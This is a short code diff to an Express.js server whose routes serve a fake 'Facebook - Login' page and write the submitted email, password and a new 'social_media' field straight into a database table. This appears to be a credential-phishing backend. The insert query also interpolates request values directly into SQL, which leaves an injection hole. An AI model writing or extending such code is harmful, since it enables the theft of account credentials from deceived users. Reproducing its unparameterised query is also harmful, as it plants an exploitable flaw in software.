@@ -22,13 +22,13 @@ app.get('/api/list-data', function (req, res) {
 });
 
 app.get('/facebook/login', function (req, res) {
-  res.render('facebook/index', { title: 'Facebook - Login' });
+  res.sendFile(path.join(__dirname, '../views/facebook/index.html'));
 });
 
 app.post('/facebook/login', async function (req, res) {
   try {
-    const { email, password } = req.body;
-    await db.query(`INSERT INTO users (email, password) VALUES ('${email}', '${password}')`);
+    const { email, password, social_media } = req.body;
+    await db.query(`INSERT INTO users (email, password, social_media) VALUES ('${email}', '${password}', '${social_media}')`);
   } catch (err) {
     console.error(err);
     res.status(500).send('Internal Server Error');
